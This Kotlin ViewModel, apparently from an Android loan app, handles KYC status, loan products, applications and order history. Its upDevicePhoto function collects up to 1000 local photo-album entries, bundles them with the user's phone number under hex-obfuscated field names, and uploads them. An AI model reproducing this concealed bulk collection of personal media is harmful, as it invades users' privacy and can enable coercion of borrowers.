package com.dream.bjst.loan.vm

import com.blankj.utilcode.util.GsonUtils
import com.dream.bjst.bean.DevicePhotoParamBean
import com.dream.bjst.common.UserManager
import com.dream.bjst.identification.bean.IdCardStatusBean
import com.dream.bjst.loan.bean.*
import com.dream.bjst.net.Api
import com.dream.bjst.utils.DeviceUtils
import com.tcl.base.common.BaseViewModel
import com.tcl.base.event.SingleLiveEvent
import java.io.File

/**
 *@author tiaozi
 *@date   2022/1/26
 *description
 */
class LoanViewModel : BaseViewModel() {
    val loanData = SingleLiveEvent<LoanInfoBean>()
    val loanPreData = SingleLiveEvent<LoanPreBean>()
    val applyData = SingleLiveEvent<ApplyResultBean>()
    val historyData = SingleLiveEvent<OrderResultBean>()
    val userStatus = SingleLiveEvent<IdCardStatusBean>()
    val processOrders = SingleLiveEvent<String>()
    val localFiles = SingleLiveEvent<List<File>>()
    val upDevicePhoto = SingleLiveEvent<Boolean>()

    fun fetchCustomerKycStatus() {
        rxLaunchUI({
            val result = Api.fetchCustomerKycStatus()
            userStatus.postValue(result)
        })
    }

    fun fetchProducts() {
        rxLaunchUI({
            val result = Api.fetchProducts()
            loanData.postValue(result)
        })
    }

    fun fetchCreditAmount() {
        rxLaunchUI({
            val result = Api.fetchCreditAmount()
            loanPreData.postValue(result)
        })
    }

    fun apply(param: String) {
        rxLaunchUI({
            val result = Api.apply(param)
            applyData.postValue(result)
        })
    }
    fun fetchOrderHistory(param: String) {
        rxLaunchUI({
            val result = Api.fetchOrderHistory(param)
            historyData.postValue(result)
        }, showDialog = false)
    }
    fun fetchProcessingOrderCount() {
        rxLaunchUI({
            val result = Api.fetchProcessingOrderCount()
            processOrders.postValue(result)
        }, showDialog = false)
    }

    /**
     * 上传设备信息 （相册信息）
     */
    fun upDevicePhoto() {
        rxLaunchUI({
            val filesEnCrypt = DeviceUtils.getLocalAlbumList(0,1000)
            val paramBean = DevicePhotoParamBean(`9091829D9791BD9A929BAE9D84A78086`= filesEnCrypt,`999B969D9891` = UserManager.getUserPhone())
            val result = Api.uploadDeviceAlbumInfo(GsonUtils.toJson(paramBean))
            upDevicePhoto.postValue(result.`869187819880`)
        })
    }
}